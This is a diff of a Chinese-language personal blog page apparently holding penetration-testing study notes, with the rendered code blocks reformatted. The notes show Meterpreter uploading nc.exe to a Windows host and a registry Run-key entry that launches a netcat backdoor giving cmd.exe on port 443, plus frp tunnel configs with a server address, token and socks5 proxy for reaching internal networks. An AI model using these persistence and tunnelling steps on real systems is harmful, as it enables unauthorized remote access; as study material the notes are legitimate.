 <p><strong>nc</strong></p>
 <p>上传系统内置的nc.exe到远程主机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\Windows\\</span><br><span class="line">[*] uploading  : /usr/share/windows-binaries/nc.exe -&gt; C:\Windows\</span><br><span class="line">[*] uploaded   : /usr/share/windows-binaries/nc.exe -&gt; C:\Windows\\nc.exe</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">meterpreter &gt; upload <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/windows-binaries/</span>nc.exe C:\\Windows\\<br>[*] uploading  : <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/windows-binaries/</span>nc.exe -&gt; C:\Windows\<br>[*] uploaded   : <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/windows-binaries/</span>nc.exe -&gt; C:\Windows\\nc.exe<br>meterpreter &gt; <br><br></code></pre></td></tr></table></figure>
 
 
 
 <p>修改注册表，将nc后门加入到注册表中</p>
 <p>注册表添加启动项执行nc 反弹shell命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc_listen -d &quot;C:\Windows\nc.exe -Ldp 443 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><code class="hljs taggerscript">reg setval -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>run -v nc_listen -d &quot;C:\Windows<span class="hljs-symbol">\n</span>c.exe -Ldp 443 -e cmd.exe&quot;<br></code></pre></td></tr></table></figure>
 
 
 
@@ -604,15 +810,15 @@
 <p>[root@VM-8-12-centos ~]# rz -b</p>
 <p>[root@VM-8-12-centos <del>]# md<br>md5sum    mdadm     mdel      mdeltree  mdir      mdmon     mdu<br>[root@VM-8-12-centos ~]# md<br>md5sum    mdadm     mdel      mdeltree  mdir      mdmon     mdu<br>[root@VM-8-12-centos ~]# md5sum &#x2F;root&#x2F;<br>5V}P櫓%1¿&#x3D;þ񴓧9ʶı¿{PpضqE󳇳󿞠.bashrc                                 .local&#x2F;                                 thinclient_drives&#x2F;<br>-7P                                    .cache&#x2F;                                 .pip&#x2F;                                   .viminfo<br>.bash_history                           .cshrc                                  .pydistutils.cfg                        .vnc&#x2F;<br>.bash_logout                            f򂭪eW贻+d1@ɪ</del>                 .ssh&#x2F;                                   .Xauthority<br>.bash_profile                           frp_0.43.0_linux_amd64.tar.gz           .tcshrc                                 .xsession-errors<br>[root@VM-8-12-centos <del>]# md5sum &#x2F;root&#x2F;<br>5V}P櫓%1¿&#x3D;þ񴓧9ʶı¿{PpضqE󳇳󿞠.bashrc                                 .local&#x2F;                                 thinclient_drives&#x2F;<br>-7P                                    .cache&#x2F;                                 .pip&#x2F;                                   .viminfo<br>.bash_history                           .cshrc                                  .pydistutils.cfg                        .vnc&#x2F;<br>.bash_logout                            f򂭪eW贻+d1@ɪ</del>                 .ssh&#x2F;                                   .Xauthority<br>.bash_profile                           frp_0.43.0_linux_amd64.tar.gz           .tcshrc                                 .xsession-errors<br>[root@VM-8-12-centos ~]# md5sum &#x2F;root&#x2F;frp_0.43.0_linux_amd64.tar.gz<br>9581f0c261d64b3f5b9762d6b9b9802d  &#x2F;root&#x2F;frp_0.43.0_linux_amd64.tar.gz<br>[root@VM-8-12-centos ~]# sha256<br>sha256hmac  sha256sum<br>[root@VM-8-12-centos ~]# sha256<br>sha256hmac  sha256sum<br>[root@VM-8-12-centos ~]# sha256sum &#x2F;root&#x2F;frp_0.43.0_linux_amd64.tar.gz<br>d458d70dd88048d1fc898d5422ed570e912d3f3ef3ee5928871438a08514f725  &#x2F;root&#x2F;frp_0.43.0_linux_amd64.tar.gz<br>[root@VM-8-12-centos ~]# tar -zxvf frp_0.43.0_linux_amd64.tar.gz<br>frp_0.43.0_linux_amd64&#x2F;<br>frp_0.43.0_linux_amd64&#x2F;frpc_full.ini<br>frp_0.43.0_linux_amd64&#x2F;frpc.ini<br>frp_0.43.0_linux_amd64&#x2F;frps_full.ini<br>frp_0.43.0_linux_amd64&#x2F;LICENSE<br>frp_0.43.0_linux_amd64&#x2F;frpc<br>frp_0.43.0_linux_amd64&#x2F;frps<br>frp_0.43.0_linux_amd64&#x2F;frps.ini<br>[root@VM-8-12-centos ~]# cd frp_0.43.0_linux_amd64&#x2F;<br>[root@VM-8-12-centos frp_0.43.0_linux_amd64]# ls<br>frpc  frpc_full.ini  frpc.ini  frps  frps_full.ini  frps.ini  LICENSE<br>[root@VM-8-12-centos frp_0.43.0_linux_amd64]# </p>
 <p>查看配置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> cat frps.ini </span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">[root@VM-8-12-centos frp_0.43.0_linux_amd64]# </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp"> cat frps.ini <br>[<span class="hljs-meta">common</span>]<br>bind_port = <span class="hljs-number">7000</span><br>[<span class="hljs-meta">root@VM-8-12-centos frp_0.43.0_linux_amd64</span>]<span class="hljs-meta"># </span><br><br></code></pre></td></tr></table></figure>
 
 <p>启动</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/frps -c ./</span>frps.ini <br><br></code></pre></td></tr></table></figure>
 
 
 
 <h3 id="part-3-内网web服务"><a href="#part-3-内网web服务" class="headerlink" title="part 3 内网web服务"></a>part 3 内网web服务</h3><p>服务端配置 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">vhost_http_port = 80</span><br><span class="line">dashboard_port = 7100</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_port = admin</span><br><span class="line">authentication_method = token</span><br><span class="line">token = Szh168</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">vhost_http_port</span> = <span class="hljs-number">80</span><br><span class="hljs-attr">dashboard_port</span> = <span class="hljs-number">7100</span><br><span class="hljs-attr">dashboard_user</span> = admin<br><span class="hljs-attr">dashboard_port</span> = admin<br><span class="hljs-attr">authentication_method</span> = token<br><span class="hljs-attr">token</span> = Szh168<br><br></code></pre></td></tr></table></figure>
 
 <p>说明：</p>
 <p>vhost_http_port :web映射服务端启用虚拟主机端口</p>
@@ -620,7 +826,7 @@
 <p>authentication_method :防止外网frp服务端被滥用采用认证方式</p>
 <p>token： token认证的value</p>
 <p>客户端配置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 175.178.254.75</span><br><span class="line">server_port = 7000</span><br><span class="line">token = Szh168</span><br><span class="line"></span><br><span class="line">[web01]</span><br><span class="line">type = http</span><br><span class="line">local_port = 80</span><br><span class="line">custom_domains = centos.thaygo.cc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">175.178</span>.<span class="hljs-number">254.75</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = Szh168<br><br><span class="hljs-section">[web01]</span><br><span class="hljs-attr">type</span> = http<br><span class="hljs-attr">local_port</span> = <span class="hljs-number">80</span><br><span class="hljs-attr">custom_domains</span> = centos.thaygo.cc<br><br></code></pre></td></tr></table></figure>
 
 <p>server_addr &#x3D; 175.178.254.75 外网frp地址</p>
 <p>token &#x3D; Szh168 :frp服务端的token，必须与外网服务端一致，才能认证通过</p>
@@ -653,150 +859,191 @@
 <p>plugin &#x3D; socks5</p>
 <p>remote_port&#x3D;1234</p>
 
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/06/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="cl4zt78hp0005xougbhkuekq3" data-title="渗透测试学习" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Penetraion/" rel="tag">Penetraion</a></li></ul>
-
-    </footer>
   </div>
+  <div id="gitalk-container"></div>
+</div>
+
+<script>
   
+Fancybox.bind('[data-fancybox="fancybox-gallery-img"]', {
+  dragToClose: true,
+  Toolbar: true,
+  closeButton: "top",
+  Image: {
+    zoom: true,
+  },
+  on: {
+    initCarousel: (fancybox) => {
+      const slide = fancybox.Carousel.slides[fancybox.Carousel.page];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+    "Carousel.change": (fancybox, carousel, to, from) => {
+      const slide = carousel.slides[to];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+  },
+});
+</script>
+
+<style>
+    #noneimg img {
+        display: none;
+        z-index: 9999;
+        /* width: 600px !important; */
+        min-width: 0%;
+        max-width: 90%;
+        max-height: 80%;
+        border-radius: 0px;
+        position: fixed;
+        box-shadow: 0 0 0px #c3c3c300 !important;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto !important;
+    }
+
+    @media screen and (max-width:600px) {
+        #noneimg img {
+            max-width: 88%
+        }
+    }
+</style>
+
+    <div class="post-paging">
     
-<nav id="article-nav">
-  
-    <a href="/2022/06/30/%E6%B7%BB%E5%8A%A0%E8%85%BE%E8%AE%AF%E4%BA%91%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          添加腾讯云域名解析
-        
-      </div>
+    <a href="/2022/06/30/%E6%B7%BB%E5%8A%A0%E8%85%BE%E8%AE%AF%E4%BA%91%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/">
+        <div class="post-paging-last">
+            <span>上一篇</span>
+            <p>添加腾讯云域名解析</p>
+        </div>
     </a>
-  
-  
-    <a href="/2022/06/20/nginx-with-rtmp-buiding/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">nginx with rtmp buiding</div>
+    
+
+    
+    <a href="/2022/06/20/nginx-with-rtmp-buiding/">
+        <div class="post-paging-next">
+            <span>下一篇</span>
+            <p>nginx with rtmp buiding</p>
+        </div>
     </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
     
+</div>
+</div>
+		
+<div class="footer">
+	<div class="Copyright">
+		©2022 By Joey. 主题：<a
+			style="text-decoration: none;display: contents; color: #898F9F;"
+			target="_blank" rel="noopener" href="https://github.com/qiaobug/hexo-theme-quiet">Quiet</a>
+	</div>
+	<div class="contact">
+		
+		<a target="_blank" rel="noopener" href="https://github.com/79E/hexo-theme-quiet">
+			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+		</a>
+		
+	</div>
+</div>
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Penetraion/" rel="tag">Penetraion</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns-tencentCloud/" rel="tag">dns tencentCloud</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/version-0-1-0/" rel="tag">version 0.1.0</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/Penetraion/" style="font-size: 10px;">Penetraion</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/dns-tencentCloud/" style="font-size: 10px;">dns tencentCloud</a> <a href="/tags/version-0-1-0/" style="font-size: 10px;">version 0.1.0</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li></ul>
-    </div>
-  </div>
+<script src="/js/gotop.js"></script>
 
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2022/06/30/%E6%B7%BB%E5%8A%A0%E8%85%BE%E8%AE%AF%E4%BA%91%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/">添加腾讯云域名解析</a>
-          </li>
-        
-          <li>
-            <a href="/2022/06/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试学习</a>
-          </li>
-        
-          <li>
-            <a href="/2022/06/20/nginx-with-rtmp-buiding/">nginx with rtmp buiding</a>
-          </li>
-        
-          <li>
-            <a href="/2022/06/20/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87blog/">我的第一篇blog</a>
-          </li>
-        
-          <li>
-            <a href="/2022/06/19/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
+<style type="text/css">
+    @media screen and (min-width: 600px) {
+        .goTop>span {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 10px;
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+            opacity: 0.8;
+            background: rgba(18, 24, 58, 0.06);
+            text-align: center;
+            transition: border .5s;
+            border: 1px solid rgba(18, 24, 58, 0.06);
 
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2022 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
+            -moz-transition: border .5s;
+            /* Firefox 4 */
+            -webkit-transition: border .5s;
+            /* Safari 和 Chrome */
+            -o-transition: border .5s;
+            /* Opera */
+        }
 
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
+        .goTop>span:hover {
+            border: 1px solid #6680B3;
+        }
 
 
-<script src="/js/jquery-3.4.1.min.js"></script>
+        .goTop {
+            position: fixed;
+            right: 30px;
+            bottom: 80px;
+        }
+
+        .goTop>span>svg {
+            width: 20px;
+            height: 20px;
+            opacity: 0.7;
+        }
+
+    }
+
+    @media screen and (max-width: 600px) {
+        .goTop {
+            display: none;
+        }
+    }
+</style>
+<div class="goTop" id="js-go_top">
+    <span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+            <g>
+                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
+            </g>
+        </svg>
+    </span>
+</div>
+<script>
+    $( '#js-go_top' )
+	.gotoTop( {
+		offset: 500,
+		speed: 300,
+		animationShow: {
+			'transform': 'translate(0,0)',
+			'transition': 'transform .5s ease-in-out'
+		},
+		animationHide: {
+			'transform': 'translate(100px,0)',
+			'transition': 'transform .5s ease-in-out'
+		}
+	} );
+</script>
 
 
+    <!-- Gitalk -->
+    <script>
+        const data = '{"clientID":"02b3c","clientSecret":"adfc7b4","repo":"gimment","owner":"duneng","admin":"duneng"}'
+        const gitalk = new Gitalk({
+            ...JSON.parse( data),
+            id:location.pathname,
+            distractionFreeMode:false
+        })
+        gitalk.render('gitalk-container')
+    </script>
 
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
+<script>
+	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/QiaoBug/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
+</script>
+	</body>
 </html>
+
